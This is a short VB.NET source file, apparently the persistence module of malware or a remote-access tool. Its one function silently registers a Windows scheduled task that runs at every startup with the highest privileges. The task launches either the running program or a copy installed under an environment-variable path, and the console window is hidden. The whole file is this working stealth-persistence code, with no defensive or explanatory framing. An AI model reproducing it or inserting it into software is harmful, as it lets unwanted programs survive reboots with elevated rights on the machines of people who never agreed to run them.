Imports System.IO
Namespace Persistence
    Public Class SchTask
        Public PATHS As String
        Public InstallName As String
        Public HardInstall As String
        Public Function AddtoSchTask()
            Try
                Dim installfullpath As FileInfo
                If HardInstall = "True" Then
                    installfullpath = New FileInfo(Path.Combine(Environ(PATHS), InstallName))
                Else
                    installfullpath = New FileInfo(Application.ExecutablePath)
                End If
                Dim pi As New ProcessStartInfo
                With pi
                    .FileName = "schtasks.exe"
                    .Arguments = "/create /f /sc ONSTART /RL HIGHEST /tn " + """'" + Path.GetFileNameWithoutExtension(installfullpath.FullName) + """'" + " /tr " + """'" + installfullpath.FullName + """'"
                    .WindowStyle = ProcessWindowStyle.Hidden
                    .CreateNoWindow = True
                End With
                Process.Start(pi)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
    End Class
End Namespace
